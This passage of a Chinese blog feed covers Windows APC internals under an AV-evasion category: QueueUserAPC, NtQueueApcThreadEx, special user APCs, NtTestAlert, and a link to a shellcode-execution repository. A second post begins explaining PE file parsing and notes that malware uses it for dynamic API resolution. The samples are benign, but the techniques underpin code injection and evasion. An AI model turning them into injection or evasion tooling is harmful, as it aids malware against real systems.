&#123;</span><br><span class="line">        DbgPrint(&quot;SXS: %s failing because RtlQueryInformationActivationContext() returned status %08lx&quot;, </span><br><span class="line">                            &quot;QueueUserAPC&quot;, Status);</span><br><span class="line">        BaseSetLastNTError(Status);</span><br><span class="line">        return 0;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    //</span><br><span class="line">    // Forward the call to the actual system call.</span><br><span class="line">    // The ApcRoutine that is used is actually a wrapper function in ntdll, called &quot;RtlDispatchApc&quot;</span><br><span class="line">    // The purpose of this wrapper function is to use the activation context passed as a parameter.</span><br><span class="line">    //</span><br><span class="line">    Status = NtQueueApcThread(</span><br><span class="line">            hThread,        // ThreadHandle</span><br><span class="line">            RtlDispatchAPC, // ApcRoutine</span><br><span class="line">            (PPS_APC_ROUTINE)pfnAPC, // SystemArgument1</span><br><span class="line">            (PVOID)dwData, // SystemArgument2</span><br><span class="line">            Info.hActCtx // SystemArgument3</span><br><span class="line">        );</span><br><span class="line"></span><br><span class="line">    if (!NT_SUCCESS(Status)) &#123;</span><br><span class="line">        BaseSetLastNTError(Status);</span><br><span class="line">        return 0;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    return 1;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">//</span><br><span class="line">// This is used as SystemArgument3 if QueueUserAPC</span><br><span class="line">// was used to queue the APC.</span><br><span class="line">//</span><br><span class="line">typedef union _APC_ACTIVATION_CTX &#123; </span><br><span class="line">    ULONG_PTR Value;</span><br><span class="line">    HANDLE hActCtx;</span><br><span class="line">&#125; APC_ACTIVATION_CTX;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">//</span><br><span class="line">// This is the actual APC routine.</span><br><span class="line">// It enables the activation context, calls the user provided routine, and deactivates the context.</span><br><span class="line">//</span><br><span class="line">VOID</span><br><span class="line">RtlDispatchAPC( // ntdll</span><br><span class="line">    PAPCFUNC pfnAPC,</span><br><span class="line">    ULONG_PTR dwData,</span><br><span class="line">    APC_ACTIVATION_CTX ApcActivationContext</span><br><span class="line">    )</span><br><span class="line">&#123;</span><br><span class="line">    RTL_CALLER_ALLOCATED_ACTIVATION_CONTEXT_STACK_FRAME_EXTENDED StackFrame;</span><br><span class="line"></span><br><span class="line">    //</span><br><span class="line">    // Initialize the StackFrame data structure.</span><br><span class="line">    //</span><br><span class="line">    StackFrame.Size = sizeof(RTL_CALLER_ALLOCATED_ACTIVATION_CONTEXT_STACK_FRAME_EXTENDED);</span><br><span class="line">    StackFrame.Format = 1;</span><br><span class="line">    StackFrame.Extra1 = 0;</span><br><span class="line">    StackFrame.Extra2 = 0;</span><br><span class="line">    StackFrame.Extra3 = 0;</span><br><span class="line">    StackFrame.Extra4 = 0;</span><br><span class="line">    </span><br><span class="line">    if (ApcActivationContext.Value == -1) &#123; </span><br><span class="line">        pfnAPC(dwData);</span><br><span class="line">        return;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    //</span><br><span class="line">    // Use the activation context of the queuing thread.</span><br><span class="line">    //</span><br><span class="line">    RtlActivateActivationContextUnsafeFast(&amp;StackFrame, ApcActivationContext.hActCtx);</span><br><span class="line">    </span><br><span class="line">    //</span><br><span class="line">    // Call the user provided routine.</span><br><span class="line">    //</span><br><span class="line">    pfnAPC(dwData);</span><br><span class="line"></span><br><span class="line">    //</span><br><span class="line">    // Pop the activation context from the &quot;activation context stack&quot;</span><br><span class="line">    //</span><br><span class="line">    RtlDeactivateActivationContextUnsafeFast(&amp;StackFrame);</span><br><span class="line">    </span><br><span class="line">    //</span><br><span class="line">    // Free the handle to the activation context.</span><br><span class="line">    //</span><br><span class="line">    RtlReleaseActivationContext(ApcActivationContext.hActCtx);</span><br></pre></td></tr></table></figure><p>正如代码和注释中展示的，攻击者插入的APC函数位于SystemArgument1中，这对于反病毒开发中想要hook的人来说，需要注意</p><h1 id="NtQueueApcThreadEx：内核内存的重复使用"><a href="#NtQueueApcThreadEx：内核内存的重复使用" class="headerlink" title="NtQueueApcThreadEx：内核内存的重复使用"></a>NtQueueApcThreadEx：内核内存的重复使用</h1><p>每次NtQueueApcThread被调用，内核模式中会有一个新的KAPC对象被创建（从内核池中）来存储关于APC对象的数据，如果有一个组件它的APC队列中有很多APC函数，这会影响性能，因为大量非分页内存被使用，并且内存分配也需要时间</p><p>在Windows 7中，微软在内核模式添加了一个非常简单的对象，叫做内存保留对象，它允许在内核模式为特定对象保留内存，在释放对象时，用相同区域存储另一个对象，这样大大减少了ExAllocatePool/ExFreePoll的调用，NtQueueApcThreadEx就是接收这样一个对象的句柄，因此允许调用者重复使用相同的内存</p><p>下述代码用于创建“保留内存”</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">//</span><br><span class="line">// 内存保留对象当前支持分配2种类型的对象</span><br><span class="line">// - User APC</span><br><span class="line">// - Io Completion</span><br><span class="line">//</span><br><span class="line">typedef enum _MEMORY_RESERVE_OBJECT_TYPE &#123;</span><br><span class="line">     MemoryReserveObjectTypeUserApc,</span><br><span class="line">     MemoryReserveObjectTypeIoCompletion</span><br><span class="line"> &#125; MEMORY_RESERVE_OBJECT_TYPE, *PMEMORY_RESERVE_OBJECT_TYPE;</span><br><span class="line"></span><br><span class="line">//</span><br><span class="line">// 这个系统调用分配一个内存保留对象</span><br><span class="line">//</span><br><span class="line">NTSTATUS</span><br><span class="line">NtAllocateReserveObject(</span><br><span class="line">    __out PHANDLE MemoryReserveHandle,</span><br><span class="line">    __in_opt POBJECT_ATTRIBUTES ObjectAttributes,</span><br><span class="line">    __in MEMORY_RESERVE_OBJECT_TYPE ObjectType</span><br><span class="line">    );</span><br><span class="line"></span><br><span class="line">//</span><br><span class="line">// 这是Windows 7中新添加的系统调用</span><br><span class="line">// 这个系统调用功能和NtQueueApcThread类似，但是允许指定一个MemoryReserveHandle</span><br><span class="line">// 使用NtAllocateReserveObject创建的对象的句柄</span><br><span class="line">//</span><br><span class="line">// 如果内存在使用中（例如，APC对象没有被释放），你可以重新使用内存</span><br><span class="line">//</span><br><span class="line">NTSTATUS</span><br><span class="line">NtQueueApcThreadEx(  </span><br><span class="line">    IN HANDLE ThreadHandle,</span><br><span class="line">    IN HANDLE MemoryReserveHandle,</span><br><span class="line">    IN PPS_APC_ROUTINE ApcRoutine,</span><br><span class="line">    IN PVOID SystemArgument1 OPTIONAL,</span><br><span class="line">    IN PVOID SystemArgument2 OPTIONAL,</span><br><span class="line">    IN PVOID SystemArgument3 OPTIONAL</span><br><span class="line">    );</span><br></pre></td></tr></table></figure><p>使用这个新对象，你可以节省KAPC对象分配的开销，示例代码如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">int main(int argc, const char** argv)</span><br><span class="line">&#123;</span><br><span class="line">NTSTATUS Status;</span><br><span class="line">HANDLE MemoryReserveHandle;</span><br><span class="line">    </span><br><span class="line">Status = NtAllocateReserveObject(&amp;MemoryReserveHandle, NULL, MemoryReserveObjectTypeUserApc);</span><br><span class="line"></span><br><span class="line">if (!NT_SUCCESS(Status)) &#123;</span><br><span class="line">printf(&quot;NtAllocateReserveObject Failed! 0x%08X\n&quot;, Status);</span><br><span class="line">return -1;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">while (TRUE) &#123;</span><br><span class="line">Status = NtQueueApcThreadEx(</span><br><span class="line">GetCurrentThread(),</span><br><span class="line">MemoryReserveHandle,</span><br><span class="line">ExampleApcRoutine,</span><br><span class="line">NULL,</span><br><span class="line">NULL,</span><br><span class="line">NULL</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line">if (!NT_SUCCESS(Status)) &#123;</span><br><span class="line">printf(&quot;NtQueueApcThreadEx Failed! 0x%08X\n&quot;, Status);</span><br><span class="line">return -1;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">        // 警报状态的</span><br><span class="line">SleepEx(0, TRUE);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">return 0;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">VOID ExampleApcRoutine(PVOID SystemArgument1, PVOID SystemArgument2, PVOID SystemArgument3) &#123;</span><br><span class="line">    // 非警报状态的</span><br><span class="line">Sleep(500); </span><br><span class="line"></span><br><span class="line">printf(&quot;This is the weird loop!\n&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>此机制被RPC服务器用来重复使用完成例程的APC对象，如果你对此感兴趣，可以进一步查看rpcrt4!CALL::QueueAPC</p><h1 id="NtQueueApcThreadEx：特殊用户APC"><a href="#NtQueueApcThreadEx：特殊用户APC" class="headerlink" title="NtQueueApcThreadEx：特殊用户APC"></a>NtQueueApcThreadEx：特殊用户APC</h1><p>Windows 10 RS5开始，加入了特殊用户APC功能，正如我上面提到的，特殊用户APC可以强制一个线程执行APC队列中的函数，无需线程处于警报状态</p><p>Windows 10 RS5中，微软不想添加新的系统调用，所以修改了NtQueueApcThreadEx来支持特殊用户APC，通过调整MemoryReserveHandle为一个联合体</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">// 定义一个枚举类型，后面只会用到QueueUserApcFlagsSpecialUserApc</span><br><span class="line">typedef enum _QUEUE_USER_APC_FLAGS &#123;</span><br><span class="line">QueueUserApcFlagsNone,</span><br><span class="line">QueueUserApcFlagsSpecialUserApc,</span><br><span class="line">QueueUserApcFlagsMaxValue</span><br><span class="line">&#125; QUEUE_USER_APC_FLAGS;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">// 之前的MemoryReserveHandle被替换为联合体USER_APC_OPTION，出于兼容性考虑，包含了之前的MemoryReserveHandle</span><br><span class="line">typedef union _USER_APC_OPTION &#123;</span><br><span class="line">ULONG_PTR UserApcFlags;</span><br><span class="line">HANDLE MemoryReserveHandle;</span><br><span class="line">&#125; USER_APC_OPTION, *PUSER_APC_OPTION;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">// 除了MemoryReserveHandle被替换为UserApcOption，其他和上面一样，这允许调用者使用UserApcOption中的MemoryReserveHandle或UserApcFlags</span><br><span class="line">NTSTATUS</span><br><span class="line">NtQueueApcThreadEx(</span><br><span class="line">IN HANDLE ThreadHandle,</span><br><span class="line">IN USER_APC_OPTION UserApcOption,</span><br><span class="line">IN PPS_APC_ROUTINE ApcRoutine,</span><br><span class="line">IN PVOID SystemArgument1 OPTIONAL,</span><br><span class="line">IN PVOID SystemArgument2 OPTIONAL,</span><br><span class="line">IN PVOID SystemArgument3 OPTIONAL</span><br><span class="line">);</span><br></pre></td></tr></table></figure><p>下面是特殊用户APC的示例代码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line">int main(</span><br><span class="line">int argc,</span><br><span class="line">const char** argv</span><br><span class="line">)</span><br><span class="line">&#123;</span><br><span class="line">PNT_QUEUE_APC_THREAD_EX NtQueueApcThreadEx;</span><br><span class="line">USER_APC_OPTION UserApcOption;</span><br><span class="line">NTSTATUS Status;</span><br><span class="line"></span><br><span class="line">NtQueueApcThreadEx = (PNT_QUEUE_APC_THREAD_EX)(GetProcAddress(GetModuleHandle(&quot;ntdll.dll&quot;), &quot;NtQueueApcThreadEx&quot;));</span><br><span class="line"></span><br><span class="line">if (!NtQueueApcThreadEx) &#123;</span><br><span class="line">printf(&quot;wtf, before win7\n&quot;);</span><br><span class="line">return -1;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">    //</span><br><span class="line">    // This is a special flag that tells NtQueueApcThreadEx this APC is a special user APC.</span><br><span class="line">    //</span><br><span class="line">UserApcOption.UserApcFlags = QueueUserApcFlagsSpecialUserApc;</span><br><span class="line"></span><br><span class="line">while (TRUE) &#123;</span><br><span class="line">//</span><br><span class="line">// This will force the current thread to execute the special user APC,</span><br><span class="line">// Although the current thread does not enter alertable state.</span><br><span class="line">        // The APC will execute before the thread returns from kernel mode.</span><br><span class="line">//</span><br><span class="line">Status = NtQueueApcThreadEx(</span><br><span class="line">GetCurrentThread(),</span><br><span class="line">UserApcOption,</span><br><span class="line">ApcRoutine,</span><br><span class="line">NULL,</span><br><span class="line">NULL,</span><br><span class="line">NULL</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line">if (!NT_SUCCESS(Status)) &#123;</span><br><span class="line">printf(&quot;NtQueueApcThreadEx Failed! 0x%08X\n&quot;, Status);</span><br><span class="line">return -1;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">//</span><br><span class="line">// This sleep does not enter alertable state.</span><br><span class="line">//</span><br><span class="line">Sleep(500);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">VOID</span><br><span class="line">ApcRoutine(</span><br><span class="line">PVOID SystemArgument1,</span><br><span class="line">PVOID SystemArgument2,</span><br><span class="line">PVOID SystemArgument3</span><br><span class="line">)</span><br><span class="line">&#123;</span><br><span class="line">printf(&quot;yo wtf?? I was not alertable!\n&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>需要注意：特殊用户APC可以打断一个不同线程的执行，在之后的文章会提到</p><h1 id="NtQueueApcThreadEx2：一些新东西"><a href="#NtQueueApcThreadEx2：一些新东西" class="headerlink" title="NtQueueApcThreadEx2：一些新东西"></a>NtQueueApcThreadEx2：一些新东西</h1><p>大约在Windows 10 19603，微软新添加了2个函数</p><ul><li>NtQueueApcThreadEx2：这是一个新的系统调用，允许同时传递UserApcFlags和MemoryReserveHandle（由于冲突检查，这并不会生效）</li><li>QueueUserAPC2：这是位于kernelbase.dll中的新的Win32 API，允许用户访问特殊用户APC</li></ul><p>这个Win32 API表明微软希望用户使用这个API，这可以被用来在线程执行期间对其发送信号，这会很有用，类似于Linux中的信号机制</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">NTSTATUS</span><br><span class="line">NtQueueApcThreadEx2(</span><br><span class="line">    IN HANDLE ThreadHandle,</span><br><span class="line">    IN HANDLE UserApcReserveHandle,</span><br><span class="line">    IN QUEUE_USER_APC_FLAGS QueueUserApcFlags,</span><br><span class="line">    IN PPS_APC_ROUTINE ApcRoutine,</span><br><span class="line">    IN PVOID SystemArgument1 OPTIONAL,</span><br><span class="line">    IN PVOID SystemArgument2 OPTIONAL,</span><br><span class="line">    IN PVOID SystemArgument3 OPTIONAL</span><br><span class="line">    );</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">DWORD</span><br><span class="line">QueueUserApc2(</span><br><span class="line">    PAPCFUNC pfnAPC,</span><br><span class="line">    HANDLE hThread,</span><br><span class="line">    ULONG_PTR dwData,</span><br><span class="line">    QUEUE_USER_APC_FLAGS Flags</span><br><span class="line">    );</span><br></pre></td></tr></table></figure><h1 id="NtTestAlert"><a href="#NtTestAlert" class="headerlink" title="NtTestAlert"></a>NtTestAlert</h1><p>NtTestAlert是Windows中警报机制相关的系统调用，它会让线程APC队列中函数执行，即使这个线程本身是不能警报的，我们会在后面探索这个机制的内部原理，通过调用NtTestAlert可以执行任何待处理的APC函数</p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>在下一篇文章中，我将继续探索APC内部原理，这个是存储APC相关代码的<a href="https://github.com/ybdt/evasion-hub/tree/master/03-shellcode%E6%89%A7%E8%A1%8C/APC%E6%9C%BA%E5%88%B6">地址</a></p><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="https://repnz.github.io/posts/apc/user-apc/">https://repnz.github.io/posts/apc/user-apc/</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;这个系列的目的是希望你能系统的理解APC的内部原理（不再是零散的理解）&lt;/p&gt;
&lt;p&gt;我重构了用户模式和内核模式下APC相关的函数，希望更好</summary>
      
    
    
    
    <category term="免杀研究" scheme="http://example.com/categories/%E5%85%8D%E6%9D%80%E7%A0%94%E7%A9%B6/"/>
    
    
  </entry>
  
  <entry>
    <title>Windows下32位汇编学习（二）PE文件解析</title>
    <link href="http://example.com/2025/09/29/Windows%E4%B8%8B32%E4%BD%8D%E6%B1%87%E7%BC%96%E5%AD%A6%E4%B9%A0%EF%BC%88%E4%BA%8C%EF%BC%89PE%E6%96%87%E4%BB%B6%E8%A7%A3%E6%9E%90/"/>
    <id>http://example.com/2025/09/29/Windows%E4%B8%8B32%E4%BD%8D%E6%B1%87%E7%BC%96%E5%AD%A6%E4%B9%A0%EF%BC%88%E4%BA%8C%EF%BC%89PE%E6%96%87%E4%BB%B6%E8%A7%A3%E6%9E%90/</id>
    <published>2025-09-29T14:55:15.000Z</published>
    <updated>2025-10-09T14:29:18.461Z</updated>
    
    <content type="html"><![CDATA[<h1 id="引言"><a href="#引言" class="headerlink" title="引言"></a>引言</h1><p>想开发反病毒引擎，第一步总是对PE文件进行解析，虽然有点落伍，但这是基础，想开发病毒也同理，很多的病毒样本在使用Indirect Syscall + 调用栈欺骗前，都需要动态调用API，这个时候就需要你了解PE文件的结构，通过解析PE文件找到IAT，进而找到PEB来动态获取地址，所以不想学也得学~</p><p>本文会介绍从书中学到的部分知识，以及通过C++和汇编分别实现一个PE文件解析器</p><p>本篇博客的学习参考罗云彬老师的《Windows环境下32位汇编语言程序设计》，尤其是第17章的“PE文件”</p><h1 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h1><p>借用一下罗云彬老师的图，PE文件从文件头到文件尾依次是：DOS部分、PE头、节表、节数据<br>DOS部分：包括DOS标识和DOS代码，为了兼容DOS系统而保留的部分<br>PE头：包括PE标识、PE头、PE可选头<br>节表：下面节数据的起始位置、大小<br>节数据：就是代码段、数据段<br><img src="/2025/09/29/Windows%E4%B8%8B32%E4%BD%8D%E6%B1%87%E7%BC%96%E5%AD%A6%E4%B9%A0%EF%BC%88%E4%BA%8C%EF%BC%89PE%E6%96%87%E4%BB%B6%E8%A7%A3%E6%9E%90/01.png" alt="image"><br>上面是用通俗的语言描述，在代码中是下面的样子  </p><h2 id="DOS部分"><a href="#DOS部分" class="headerlink" title="DOS部分"></a>DOS部分</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">IMAGE_DOS_HEADER &#123;</span><br><span class="line">    e_magic    2字节    // DOS标识</span><br><span class="line">    ...</span><br><span class="line">    e_lfanew    4字节    // PE头相对文件头的偏移量</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>常用的就是e_magic和e_lfanew，DOS标识转换成字符就是常见的MZ（MZ是DOS创始人名字的首字符）</p><h2 id="PE头"><a href="#PE头" class="headerlink" title="PE头"></a>PE头</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">IMAGE_NT_HEADERS &#123;</span><br><span class="line">    Signature    4字节    // PE标识</span><br><span class="line">    IMAGE_FILE_HEADER</span><br><span class="line">    IMAGE_OPTIONAL_HEADER32</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">IMAGE_FILE_HEADER &#123;</span><br><span class="line">    Machine                 2字节    // 运行平台</span><br><span class="line">    NumberOfSections        2字节    // 文件的节数目</span><br><span class="line">    TimeDateStamp           4字节    // 文件创建的时间和日期</span><br><span class="line">    ...</span><br><span class="line">    SizeOfOptionalHeader    2字节    // IMAGE_OPTIONAL_HEADER32的大小</span><br><span class="line">    Characteristics         2字节    // 这是一个EXE文件还是DLL文件还是别的类型的文件</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">IMAGE_OPTIONAL_HEADER32 &#123;</span><br><span class="line">    ...</span><br><span class="line">    AddressOfEntryPoint    4字节    // 程序装入内存后从这个地址开始执行</span><br><span class="line">    ImageBase              4字节    // 程序装入内存后在内存中的起始地址，默认起始地址就是调试器中常看到的0x00400000</span><br><span class="line">    SectionAlignment       4字节    // 内存中对齐的最小单位</span><br><span class="line">    FileAlignment          4字节    // 文件中对齐的最小单位</span><br><span class="line">    Subsystem              2字节    // 指定是GUI程序还是CLI程序</span><br><span class="line">    DataDirectory          IMAGE_DATA_DIRECTORY * 16    // 这是一个数组，里面包含16个IMAGE_DATA_DIRECTORY</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">IMAGE_DATA_DIRECTORY &#123;</span><br><span class="line">    VirtualAddress    4字节    // 起始地址</span><br><span class="line">    isize             4字节    // 大小</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到PE头就复杂多了，上面的结构体和注释已经展示了大部分字段的含义，再补充一下DataDirectory，Windows PE文件中，代码段和数据段是按照装入内存后的属性划分的，装入内存后这段数据是可读可执行，那这段数据在装入内存前就位于代码段，装入内存后这段数据是只读，那这段数据在装入内存前就位于只读数据段，可是问题来了，像导出表、导入表装入内存后都是只读，所以都位于数据段，那我们改如何区分它们呢，就是利用DataDirectory，16个IMAGE_DATA_DIRECTORY，序号是0-15，依次表示</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">0    导出表</span><br><span class="line">1    导入表</span><br><span class="line">2    资源</span><br><span class="line">...</span><br><span class="line">5    重定位表</span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>还需要注意，这里的偏移指的是程序被装载到内存后，在内存中的偏移，由于内存对齐的最小单位和文件对齐的最小单位不同（还有其他因素），内存中的偏移和文件中的偏移并不一致</p><h2 id="节表"><a href="#节表" class="headerlink" title="节表"></a>节表</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">IMAGE_SECTION_HEADER &#123;</span><br><span class="line">    Name                   8字节    // Byte[8]，8个字节的数组</span><br><span class="line">    union &#123;</span><br><span class="line">        PhysicalAddress    4字节    //</span><br><span class="line">        VirtualSize        4字节    // 被文件对齐和内存对齐前的实际大小</span><br><span class="line">    &#125;</span><br><span class="line">    PointerOfRawData       4字节    // 在文件中相对于文件头的偏移</span><br><span class="line">    SizeOfRawData          4字节    // 被文件对齐后的大小</span><br><span class="line">    VirtualAddress         4字节    // 在内存中相对于内存基址的便宜</span><br><span class="line">    Characteristics        4字节    // 节的各种属性，是否可读、可写、可执行等等</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>例1，想要计算只读数据段中偏移20个字节的数据A在内存中的地址，假如PE被装载的起始地址是0x00400000，那么A在内存中的地址就是0x00400000+VirtualAddress+20Byte<br>例2，已知一个RVA，想计算在文件中的偏移地址：<br>1、通过例1的方式分别得到每个节在内存中的地址，节1在内存中的地址Addr1，节2在内存中的地址Addr2<br>2、Addr1 &lt;= 0x00400000+VirtualAddress+20Byte &lt; Addr1+VirtualSize，通过这个方式判断A在哪个节中<br>3、RVA - 对应节的起始地址 + PointerOfRawData就是在文件中的偏移<br>有人可能会问，节在内存中的大小是经过SectionAlignment对齐的，不等于VirtualSize，为什么是Addr1+VirtualSize，假如VirtualSize是0x523，在内存中经过SectionAlignment是0x1000，从0x523开始到后面都被填充0，所以在比较的时候可以忽略后面的部分，只计算Addr1+VirtualSize</p><h2 id="节数据"><a href="#节数据" class="headerlink" title="节数据"></a>节数据</h2><p>就是代码段、数据段、只读数据段、等等</p><h2 id="导入表"><a href="#导入表" class="headerlink" title="导入表"></a>导入表</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">IMAGE_IMPORT_DESCRIPTOR &#123;</span><br><span class="line">    union &#123;</span><br><span class="line">        ...</span><br><span class="line">        OriginalFirstThunk    4字节    // 指向包含IMAGE_THUNK_DATA的数组</span><br><span class="line">    &#125;</span><br><span class="line">    ...</span><br><span class="line">    Name1                     4字节    // DLL文件名称</span><br><span class="line">    FirstThunk                4字节    // 指向包含IMAGE_THUNK_DATA的数组</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">IMAGE_THUNK_DATA &#123;</span><br><span class="line">    union &#123;</span><br><span class="line">        ForwarderString    4字节</span><br><span class="line">        Function    